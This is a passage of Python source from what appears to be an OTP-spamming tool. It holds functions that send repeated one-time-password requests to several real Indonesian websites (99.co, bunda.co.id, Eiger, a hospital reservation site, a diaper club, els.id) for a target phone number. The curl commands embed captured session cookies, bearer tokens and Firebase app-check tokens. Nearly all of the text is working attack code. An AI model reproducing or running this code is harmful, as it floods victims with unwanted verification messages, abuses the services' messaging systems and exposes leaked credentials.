  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'content-type: application/json' \\
  -H 'origin: https://app.kpoin.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://app.kpoin.com/registration' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: visid_incap_3193850=KSLZkw3rSLCIdgxnG1LswfKchWoAAAAAQUIPAAAAAADtP1pV9DavhkjEGjxo5FyR; incap_ses_735_3193850=cukdVA7pdgcKbznhtD4zCvKchWoAAAAAHsqxaKqc92iy2SZvSmff8Q==; incap_ses_1746_3193850=Ma70GopLew+tpns7ZQo7GPachWoAAAAAIbXttysbxxBFyqv+jfrzDA==; _ga=GA1.1.1435000739.1787141371; _fbp=fb.1.1787141372954.767928535296203971; _tt_enable_cookie=1; _ttp=01M0CYTF8JWD243X9ZGVY2FH98_.tt.1; androidBannerClosed=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjoidHJ1ZSIsImlhdCI6MTc4NzE0MTM3OCwiZXhwIjoxNzg3NDAwNTc4fQ.m3crPZsDXe4smAhYEWNhOFOdEm3VkxWt3lMiC8AC1DU; _ga_XH6QC1GPNY,G-FCEP7R9YXY,G-E0QWTN64ED=GS2.1.s1787141390$o1$g0$t1787141390$j60$l0$h0; _ga_XH6QC1GPNY=GS2.1.s1787141371$o1$g1$t1787141397$j34$l0$h752977670; _gcl_au=1.1.1659628713.1787141369.-.-.1787141371.1651972348.1787141372.1787141397; _ga_E0QWTN64ED=GS2.1.s1787141371$o1$g1$t1787141398$j33$l0$h455275594; _ga_FCEP7R9YXY=GS2.1.s1787141372$o1$g1$t1787141398$j34$l0$h139101688; _Tk=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7ImFjY2Vzc1Rva2VuIjoiZTJhZTkyZWQzZDVkZTM1YzQyNGEyZDM4YmI0MmE2N2I0ZGMzMjIzOTg5ZGJiMTRiMTg3ZjIzMmUwYzRhYTFlYzAxZWNlMmYxYzlkODJiMmVlZDc1YzY4Yzk1NGFmYjdhZjc1ODJkYTAzM2Y4ZTgwYmQyZjY3YWQwMTYxMzYzMzU4OGFjNTY4ZWY2OGQyNGUwOWMxZGQ4ZDA1MjQxYmFiM2Q1NGE0MjBiMzNmYzBlYWZiYWYyOGUwM2Q5ZjIzZTQ5YjFiNjc1YzhjNDNhMjA3NDAyNjhiZDIyMmRjNDNjZGMxOTc5YTM2ZjcxOTY0ZmMzZjE3MDc0MGM5Y2RkZWZlYWY0Njg3YTY5Yzk0MjZmMDM0OGYzNDUwZTg5OGM0YWI2NjQ0ZTE5YzJhMDdjYzM4Zjk4NzU1ZmM4NGU5YzI4MGJiYmVmZmYwYzFhM2Q0NDQyNTAxYzVlYTgyZTMzY2VmZTM5MzViNjk4ZmJjOWVjOWRkYTRlNWEwYiIsImV4cGlyZWQiOiI2MzkyMjczOTQwMDAwMDAwMDAifSwiaWF0IjoxNzg3MTQxNDAwLCJleHAiOjE3ODc0MDYwMDB9.AzOTIf9SzmaSe0MYRiTGUK6RHhp4UD30NVunGF-SBhY; ttcsid=1787141373225::bgd_SWk9Rs6CgIaLfruw.1.1787141420005.0::1.19758.25594::46657.5.361.870::0.0.0; ttcsid_CRBTL1JC77U6RBG4JJL0=1787141373222::USQsoHY5IKaPHuP-dQ7i.1.1787141420006.1; _Ureg=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7IlBob25lTm8iOiIwODM4MzIxMTA1MDkiLCJSZWZlcnJhbENvZGUiOiIifSwiaWF0IjoxNzg3MTQxNDIwLCJleHAiOjE3ODc0MDA2MjB9.xvsHxg22HWujKk9ueKqr_dmmR3_uJE-w86tS4sBLy7w' \\
  -H 'priority: u=1, i' \\
  -d '{{"UniqueID":"{phone}","NotifType":"109104","OtpType":"{otp_type}","OtpDigit":6}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_99co(nomor):
    try:
        if nomor.startswith('0'):
            phone = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            phone = '+62' + nomor
        elif nomor.startswith('+62'):
            phone = nomor
        else:
            phone = '+62' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('62'):
            phone = '62' + phone
        
        phone = '+' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://www.99.co/id/api/biz/messaging/otp-events' \\
  -H 'host: www.99.co' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODcxNDg1MDcsImlhdCI6MTc4NzE0NDkwNywianRpIjoiMGJiNTk2NmUtNWFjYS00NGJiLWExYTMtNjMzNGQ3MjlkMjEyIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiMjY3N2Y0MDAtOTVlNC00NjEzLWJlY2UtZWVkYzM0ZDE2OWE0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjMyMDhhYmU0LTI1ZjctNDIwMi1hNzljLTdkYjQ3Mzk3YzFkZSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiMzIwOGFiZTQtMjVmNy00MjAyLWE3OWMtN2RiNDczOTdjMWRlIiwiY29yZV91dWlkIjoiNTkxNzJkNjktODI1Ni00MWRlLWIxYTktZmFlYjQ4ODM1ZThlIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiJjYTE5YTJhZC1lMTlkLTQ3YTMtOGQwZS0yMzJhNjhiOGIyOTgiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJ0ZXN0aW1vbmkgYWFhYTgjODMiLCJjb3JlX2N1c3RvbWVyX3V1aWQiOiIyNjZlYzAzYS1iZTczLTQzZWQtODEyNi02NDZjMzc2MjkxYmYiLCJlbWFpbCI6InRlc3RpbW9vb3Nra2RqczE5bWlAZ21haWwuY29tIn0.VqqVrTIAPNKv9dCTEvXfRjopfv2Pp2q1vviklB2kqMHuCSmVoYfA1OqrZF6W8qEo5cVL6joSsxTplMqHM6Da-w' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'baggage: sentry-environment=production,sentry-release=c928e07fcd93cfdde3580c19dc671d781ef22fa0,sentry-public_key=a05fe8bc05a068bbf916024d2d1e9ed2,sentry-trace_id=ab490fa074854059a800588a8f67ff14,sentry-org_id=396133,sentry-transaction=%2F,sentry-sampled=false,sentry-sample_rand=0.5645084361255753,sentry-sample_rate=0' \\
  -H 'sentry-trace: ab490fa074854059a800588a8f67ff14-ae1ab7e4072b3ec5-0' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'content-type: application/json' \\
  -H 'origin: https://www.99.co' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.99.co/id' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _99-acs-token=eyJhbGciOiJFUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICJybzJ6ZThOYkFNUW1QTlVVZFcwTjItNnE5bWNleHJHcHdFNS0xd3hQQWJzIn0.eyJleHAiOjE3ODcxNDg1MDcsImlhdCI6MTc4NzE0NDkwNywianRpIjoiMGJiNTk2NmUtNWFjYS00NGJiLWExYTMtNjMzNGQ3MjlkMjEyIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiMjY3N2Y0MDAtOTVlNC00NjEzLWJlY2UtZWVkYzM0ZDE2OWE0IiwidHlwIjoiQmVhcmVyIiwiYXpwIjoiZnJvbnRlbmQtYXBwIiwic2Vzc2lvbl9zdGF0ZSI6IjMyMDhhYmU0LTI1ZjctNDIwMi1hNzljLTdkYjQ3Mzk3YzFkZSIsImFjciI6IjEiLCJyZWFsbV9hY2Nlc3MiOnsicm9sZXMiOlsic2VsbGVyIiwidW1hX2F1dGhvcml6YXRpb24iLCJkZWZhdWx0LXJvbGVzLTk5aWQtcHJvZCIsImJ1eWVyIl19LCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiMzIwOGFiZTQtMjVmNy00MjAyLWE3OWMtN2RiNDczOTdjMWRlIiwiY29yZV91dWlkIjoiNTkxNzJkNjktODI1Ni00MWRlLWIxYTktZmFlYjQ4ODM1ZThlIiwiZW1haWxfdmVyaWZpZWQiOmZhbHNlLCJjb3JlX2NvbnN1bWVyX3V1aWQiOiJjYTE5YTJhZC1lMTlkLTQ3YTMtOGQwZS0yMzJhNjhiOGIyOTgiLCJwcmVmZXJyZWRfdXNlcm5hbWUiOiJ0ZXN0aW1vbmkgYWFhYTgjODMiLCJjb3JlX2N1c3RvbWVyX3V1aWQiOiIyNjZlYzAzYS1iZTczLTQzZWQtODEyNi02NDZjMzc2MjkxYmYiLCJlbWFpbCI6InRlc3RpbW9vb3Nra2RqczE5bWlAZ21haWwuY29tIn0.VqqVrTIAPNKv9dCTEvXfRjopfv2Pp2q1vviklB2kqMHuCSmVoYfA1OqrZF6W8qEo5cVL6joSsxTplMqHM6Da-w; _99-ref-token=eyJhbGciOiJIUzI1NiIsInR5cCIgOiAiSldUIiwia2lkIiA6ICI0MjllZjYyYy03NDU4LTRhMDQtOTNlNC1mMDJjYWNiZjY4NTcifQ.eyJleHAiOjE3ODc3NDk3MDcsImlhdCI6MTc4NzE0NDkwNywianRpIjoiZjI3OTlmYjktYTQ5ZC00MjY4LTk3MzEtMDE1NTExNWE2ODUxIiwiaXNzIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwiYXVkIjoiaHR0cHM6Ly9rZXljbG9hay1pZC45OS5jby9yZWFsbXMvOTlpZC1wcm9kIiwic3ViIjoiMjY3N2Y0MDAtOTVlNC00NjEzLWJlY2UtZWVkYzM0ZDE2OWE0IiwidHlwIjoiUmVmcmVzaCIsImF6cCI6ImZyb250ZW5kLWFwcCIsInNlc3Npb25fc3RhdGUiOiIzMjA4YWJlNC0yNWY3LTQyMDItYTc5Yy03ZGI0NzM5N2MxZGUiLCJzY29wZSI6InByb2ZpbGUtbWluaW1pemUgY29yZS11dWlkIGVtYWlsIiwic2lkIjoiMzIwOGFiZTQtMjVmNy00MjAyLWE3OWMtN2RiNDczOTdjMWRlIn0.40VVHypaU2lxlcNif3cyNKNQ6NqCESpC9F6gpa4R4TA; country=ID; _fbp=fb.1.1783634838553.530234959419040031; __cf_bm=mHd7ebZZvr9QC4g39gJRTX7n8RbxTABa2vptnPN2jnY-1787144797.8016622-1.0.1.1-XuJ5D0MeHxyWcNU8ijk.OhbYJMH9JyHuoOPWG8NxQlnURKBzM92HhOPEnC22T6gv1lGsn.Q94dkbDfxAh0obTw30tgNFaVAYsKCcoHDul_e5o4iQ3AdY4oQVdsRmqus9; NEXT_LOCALE=en; nid=1468adb9-ef60-4b93-80f8-67f6d905429b; ajs_anonymous_id=1468adb9-ef60-4b93-80f8-67f6d905429b; WZRK_G=c5063a1d88cc4d57b481ff69e6271672; WZRK_S_6Z6-5Z4-R56Z=%7B%22p%22%3A1%2C%22s%22%3A1787144803%2C%22t%22%3A1787144805%7D; dbb_rum=%7B%22date%22%3A1787144796651%2C%22id%22%3A%22mt03vai3tjl67ja56e.i%22%2C%22hnc%22%3A1%2C%22nc%22%3A1%2C%22conv%22%3A%5B%5D%2C%22sample%22%3Afalse%7D; g_state={"i_l":0,"i_ll":1787144808996,"i_b":"4d9tCoq6T065IxLpbI3/B9pCnohc4rpf66c/WYlUFiM","i_e":{"enable_itp_optimization":24},"i_et":1787144808996}; _xsrf=2|c7bf88e2|2ee5e97e7c0d5421580d7ed032370b4e|1787144810; _gcl_au=1.1.642346103.1783634927; _gid=GA1.2.998693239.1787144812; _ga_6C5VMQ1JNP=GS2.1.s1787144812$o1$g0$t1787144813$j59$l0$h0; _ga_GG21BH9GS5=GS2.1.s1787144813$o1$g0$t1787144813$j60$l0$h0; __rtbh.uid=%7B%22eventType%22%3A%22uid%22%2C%22id%22%3A%22unknown%22%2C%22expiryDate%22%3A%222027-08-19T13%3A06%3A54.597Z%22%7D; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22GAhcAYFrDoxEYfSp94nX%22%2C%22expiryDate%22%3A%222027-08-19T13%3A06%3A54.600Z%22%7D; _ga_9FDXXVZSH0=GS2.1.s1787144814$o1$g0$t1787144814$j60$l0$h0; meid=ddb8aaf2-e634-40d3-bdde-198c0d309838; intercom-id-e90pxaa2=a14209fa-dc61-4abe-94cc-e50af422bdd5; intercom-session-e90pxaa2=; intercom-device-id-e90pxaa2=154bdeab-bd24-418e-b61a-3d77de4e79b9; _ga_ZJWD7VVPHG=GS2.2.s1787144822$o2$g0$t1787144822$j60$l0$h0; _ga=GA1.1.1461816152.1783634837; cto_bundle=RcS8X19sbFllSDZ6eG1VcEtESVM0ZDglMkJycFA1RlFIRGg4WGxyS01OcUV3MjdYVlZtdlhrcUglMkJ1c2J6MXN6UTVHVjR0Mnc5ZHkzZDdzOVVRcVVTOVlKUXlTUTZXV3BDeVZ6UXNmbzZhc0tBS1ElMkIxUzclMkJSYUx2NzZ2UDU3OURyY0lhc0tiaFc2JTJCa0dHRWlFSm1meWhMakZtMEJRJTNEJTNE; _ga_Q823T54LSF=GS2.1.s1787144823$o2$g1$t1787144905$j38$l0$h0' \\
  -H 'priority: u=1, i' \\
  -d '{{"brand":"99id","destination_address":"{phone}","type_id":2}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_bunda_cms(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://cms.bunda.co.id/api/v1/auth/send-otp' \\
  -H 'host: cms.bunda.co.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-firebase-appcheck: eyJraWQiOiJrMnhhbUEiLCJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxOjU5NjU2Mzg5ODEwMzp3ZWI6Y2VmNTMwYWNmYjgzZGY4NDdhZWRmMiIsImF1ZCI6WyJwcm9qZWN0cy81OTY1NjM4OTgxMDMiLCJwcm9qZWN0cy9ibWhzLXdlYi1hcHBzIl0sInByb3ZpZGVyIjoicmVjYXB0Y2hhX3YzIiwiaXNzIjoiaHR0cHM6Ly9maXJlYmFzZWFwcGNoZWNrLmdvb2dsZWFwaXMuY29tLzU5NjU2Mzg5ODEwMyIsImV4cCI6MTc4NzIzNzQ1MCwiaWF0IjoxNzg3MTUxMDUwLCJqdGkiOiJ4YUEydzFUWnpxVHgtU2NHOGVQUGRqRkV3OHRVWUZhdXhfa3ExckthNVpBIn0.0GtUrReLPvBzyUZSeojw_D4CQfRcIhYS4kwTpuwMmbpQ8VquBJUyaEcSl28Rpq0_LrEcRkz-nHrAHtD2V-trDLQYzXIq2rC-JYWm3YadIDgh3FQ_nWrzdUUHfDLwCpgUU0QdopTXt1IkqEVK29vHjndK-s4yADZtVkV61DNzUKQKqCwcEH2Imw9q7GFEo19EhIYLIVd06Zdvit_GnPr93zYtuwzuIMPXcOghmqzsgER0vec2JQAr7oIc7Za47y_MNhtfJ5duSoDDb0MzyHaMJ0xX_-s6WIWT8gUI2uCwW2asUALRSouydvlOgMGpBkcZHAThBLYJ3k11iNEUUV-nwVb15PUjLM6y3XRHWXwEZ_1WAVy3GDFk-mxnGY8ez2X1xX64JJSVJMMqbwl_V0XccWPtlYEBP3MvmpgVl33lF6Pb9ZMaVAVv2C2h_8V6ik0rhsequDyDgd1as20UUagHfZEUIJCiMhktSc2yykuoGiXVTasq5dROxcQgEwPYN66x' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'content-type: application/json' \\
  -H 'x-locale: id' \\
  -H 'origin: https://www.bunda.co.id' \\
  -H 'sec-fetch-site: same-site' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://www.bunda.co.id/id' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'priority: u=1, i' \\
  -d '{{"phone_number":{phone},"type":"auth"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False
        
def spam_otp_eiger(nomor):
    try:
        if nomor.startswith('0'):
            phone = '+62' + nomor[1:]
        elif nomor.startswith('62'):
            phone = '+62' + nomor
        elif nomor.startswith('+62'):
            phone = nomor
        else:
            phone = '+62' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('62'):
            phone = '62' + phone
        
        phone = '+' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://careloyalty.eigerindo.co.id/api/v1/otp/send' \\
  -H 'host: careloyalty.eigerindo.co.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://club.eigeradventure.com' \\
  -H 'sec-fetch-site: cross-site' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://club.eigeradventure.com/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -d '{{"mobile_phone":"{phone}","via":"whatsapp"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False
        
def spam_otp_pkumayong(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor
        elif nomor.startswith('62'):
            phone = '0' + nomor[2:]
        elif nomor.startswith('+62'):
            phone = '0' + nomor[3:]
        else:
            phone = '0' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        if not phone.startswith('0'):
            phone = '0' + phone
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://reservasi.pkumayong.com/reqOTP' \\
  -H 'host: reservasi.pkumayong.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'x-requested-with: XMLHttpRequest' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://reservasi.pkumayong.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://reservasi.pkumayong.com/login' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: XSRF-TOKEN=eyJpdiI6IlFydHpESGdLMTRCSFR2cmczOUE1b2c9PSIsInZhbHVlIjoiaks0WkgzMEtHVWlMZWY5ZXFlUHVkTmJ2cURNQmw5V0JkeThPcm9MY01jVzZXSUZzc1RQU2RQdnZMOW43NHc1YVBpeldxNVN6V2h6cUpReUZyQkNoeWc9PSIsIm1hYyI6IjM0YzY0NDI3NjE2MjZhMjBmYWQ4ODMzMDRjYTVmYzRlYThiMmEyNTljNjNmNzNjOTNkNmVhYzRkMDM0OGUzNmYifQ%3D%3D; laravel_session=eyJpdiI6ImFPYTl6djJpUGhYWjAxSGJpQThnWlE9PSIsInZhbHVlIjoiaExkQU02Q2diRnczM2RESzNxOTN3enBNYUdhOTRwYWNkSGpoK3ZpNm1QOUxJY3hBZ20yKzJMXC9yc0FReGRQUnlXSXBkS3dLSUxiMFNHelFNSmhpQ3FnPT0iLCJtYWMiOiJmY2IyYzYyYzAyZWE1NjlhYmUxZjlmMGJmNmQ4MTQ3MTMzNTBjMzA4Njc3MzYyYzQ1OTQxNzU5OTc3OTlhMjVhIn0%3D' \\
  -H 'priority: u=1, i' \\
  --data-raw '_token=VNbW1nBJZCtIWp0264iC0O2ao5qVpGRCpX9UW1NW&nohp={phone}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def loading_spinner():
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    i = 0
    while not stop_spinner:
        sys.stdout.write(f"\r{U}❯❯❯ {W}Mengirim OTP {R} │ {W}{chars[i % len(chars)]}{N}")
        sys.stdout.flush()
        i += 1
        time.sleep(0.1)
    sys.stdout.write("\r" + " " * 40 + "\r")
    sys.stdout.flush()

def spam_otp_babyhappy(nomor):
    try:
        if nomor.startswith('0'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor[2:]
        elif nomor.startswith('+62'):
            phone = nomor[3:]
        else:
            phone = nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        import subprocess
        import json
        
        curl_cmd = f"""curl -s -X POST 'https://club.babyhappydiapers.com/api/registration/resend-otp-phone' \\
  -H 'host: club.babyhappydiapers.com' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json, text/plain, */*' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://club.babyhappydiapers.com' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://club.babyhappydiapers.com/registration' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _gcl_au=1.1.1607778853.1787457141; _ga=GA1.1.345266246.1787457141; _tt_enable_cookie=1; _ttp=01M0PBZ2G221DTCR2TCZP9NR5J_.tt.1; _fbp=fb.1.1787457144780.679918106559872972.AQYAAQIB; ttcsid_D6J6BNRC77UCPJEO2GU0=1787457145405::yZHNrp369Xay2lZSg8Ah.1.1787457156785.1; cphone={phone}; _gcl_gs=2.1.k1$i1787457792$u37029106; _gcl_aw=GCL.1787457796.CjwKCAjwkaXUBhASEiwAZI3ds8_i9ubY7AiAmkjJ6S2JxDvkIP3eWg1n09EdLYlRyHm_otGZPRiQOxoCOH0QAvD_BwE; ttcsid=1787457145411::Ue7LBTLOfkm-jeYclKyU.1.1787457846118.0::1.670669.651725::700582.25.326.828::685893.16.125; ttcsid_D7SQ6T3C77U4TTGIHFM0=1787457145433::EJ3SqZp4PDfpKlkAnNZT.1.1787457846120.1; _ga_KKVZ5M822G=GS2.1.s1787457141$o1$g1$t1787457846$j9$l0$h0' \\
  -H 'priority: u=1, i' \\
  -d '{{"phone":"{phone}"}}'"""
        
        result = subprocess.run(['bash', '-c', curl_cmd], capture_output=True, text=True)
        
        if result.returncode == 0 and result.stdout:
            try:
                data = json.loads(result.stdout)
                if data.get('success') or data.get('status') == 'success':
                    return True
                if data.get('message') and 'otp' in str(data.get('message')).lower():
                    return True
                return False
            except:
                return True
        return False
        
    except Exception as e:
        return False

def spam_otp_els(nomor):
    try:
        if nomor.startswith('0'):
            phone = '62' + nomor[1:]
        elif nomor.startswith('+62'):
            phone = nomor[1:]
        elif nomor.startswith('62'):
            phone = nomor
        else:
            phone = '62' + nomor
        
        phone = ''.join(filter(str.isdigit, phone))
        
        import subprocess
        import json
        import random
        import string
        
        name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 7)))
        
        curl_cmd = f"""curl -s -X POST 'https://member.els.id/api/publics/membership/auth/otp/register/send' \\
  -H 'host: member.els.id' \\
  -H 'sec-ch-ua-platform: "Android"' \\
  -H 'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Mobile Safari/537.36' \\
  -H 'accept: application/json' \\
  -H 'sec-ch-ua: "Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"' \\
  -H 'content-type: application/json' \\
  -H 'sec-ch-ua-mobile: ?1' \\
  -H 'origin: https://member.els.id' \\
  -H 'sec-fetch-site: same-origin' \\
  -H 'sec-fetch-mode: cors' \\
  -H 'sec-fetch-dest: empty' \\
  -H 'referer: https://member.els.id/' \\
  -H 'accept-encoding: gzip, deflate, br, zstd' \\
  -H 'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' \\
  -H 'cookie: _gcl_au=1.1.838671011.1787470004; _ga=GA1.1.682741423.1787470005; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-08-23%2007%3A26%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fels.id%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2026-08-23%2007%3A26%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fels.id%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; 